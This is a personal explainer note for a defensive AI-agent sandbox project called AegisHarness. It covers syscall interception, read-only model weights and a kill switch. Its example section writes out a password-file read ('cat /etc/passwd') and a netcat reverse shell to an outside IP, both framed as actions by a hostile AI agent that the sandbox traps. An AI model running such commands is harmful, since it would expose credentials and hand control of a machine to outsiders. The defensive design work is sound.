# 📘 Explainer Note 03: Ephemeral Sandbox & Syscall Interceptor

> **Note:** This file is strictly for your personal learning. Because it is in `.gitignore`, Git will never push this file to GitHub.

---

## 🎯 What did we build in this commit?

In this commit, we built the core defense barrier of the **Target Zone**:
1. **`aegis/core/sandbox.py`**:
   - The **Ephemeral Target Sandbox**: A disposable, temporary environment where the AI agent runs its tools.
   - The **Syscall Interception Engine**: A virtual checkpoint (simulating Google's **gVisor**) that inspects every request the AI tries to make to the computer.
   - The **Read-Only Model Weights Mount**: Locks the AI model's brain so an attacker cannot corrupt or modify foundational AI weights.
   - The **Instant Container Slaughter Mechanism**: A kill switch that obliterates the sandbox, wipes memory, and cleans the temporary disk in under 5 milliseconds!

---

## 🔬 How does Syscall Interception work? (In Plain English)

Whenever any program on a computer wants to touch reality (open a file, start another program, or talk to the internet), it cannot do it directly. It must ask the computer's central operating system kernel for help. That request is called a **System Call (Syscall)**.

Think of it like a prisoner in a prison cell who wants things:
- If the prisoner wants a glass of water (a safe command like `read` or `write`), the guard hands it over.
- But if the prisoner asks for a metal file, dynamite, or a phone to call their mafia boss outside:
  - In normal computers, the server simply obeys!
  - In **AegisHarness**, our **Syscall Interceptor** stands in front of the door.

### Real Examples Trapped by our Interceptor:
1. **The Password Thief:** The AI runs `cat /etc/passwd`.
   - The program tries to call `openat(257)` on `/etc/passwd`.
   - Our interceptor recognizes this restricted path, blocks the call, raises a `SecurityViolation`, and alerts the Blue-Team!
2. **The Reverse Shell:** The AI runs `nc -e /bin/sh 198.51.100.23 4444` to give a hacker outside control.
   - The program tries to call `socket(41)` and `connect(42)`.
   - Our Zero-Trust firewall intercepts the call and drops it immediately.
3. **Weight Tampering:** The AI tries to overwrite its own foundation weights (`unlink` / `write`).
   - The interceptor blocks it because the volume is strictly read-only.
4. **Instant Slaughter:** The moment a SEV-1 threat occurs, the orchestrator triggers `slaughter()`. The sandbox is destroyed, memory is wiped, and the event is logged into the tamper-proof ledger!

---

## ⏭️ What is coming in Commit 04?
In the next commit, we will build:
- **`aegis/core/egress_firewall.py`**: The dedicated **Zero-Trust Network Egress Monitor**.
- **`aegis/core/threat_detector.py`**: The **Heuristic & eBPF-like Threat Classifier** that evaluates severity (SEV-1 Critical to SEV-4 Info) and matches attack patterns in real time!
